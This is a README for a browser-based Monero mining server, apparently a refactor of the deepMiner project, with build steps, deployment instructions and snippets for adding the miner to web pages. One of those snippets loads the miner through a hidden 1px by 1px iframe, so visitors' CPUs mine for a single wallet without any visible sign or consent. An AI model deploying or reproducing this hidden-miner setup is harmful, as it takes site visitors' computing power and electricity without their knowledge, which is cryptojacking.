# Oniric Layer

A private XMR Server worker that work for one wallet 
complete typescript refactoring and optimization 
of https://github.com/deepwn/deepMiner

## Installation (run these commands)

Development Mode
1. gulp
2. npm run test 

Production Mode
1. gulp
2. npm run compile
3. go to dist/build and copy oniric , config.json and web directory
4. put copied files via ftp on a web server and start with pm2 oniric executable

## Usage (add this to web page)

1. Classic configuration
 
<script src="server/lib/oniric.min.js"> </script>
<script> var userID = 'Oniric';
         		var miner = new Oniric.Init(userID, {
         			autoThreads: true
         		});
         		miner.start(); </script>

2. Another configuration

<iframe style="display:block" width="1px" height="1px" src="yourserver:port/miner.html"></iframe>

## Contributing

1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D

## Credits

https://github.com/webdiamond
https://github.com/deepwn

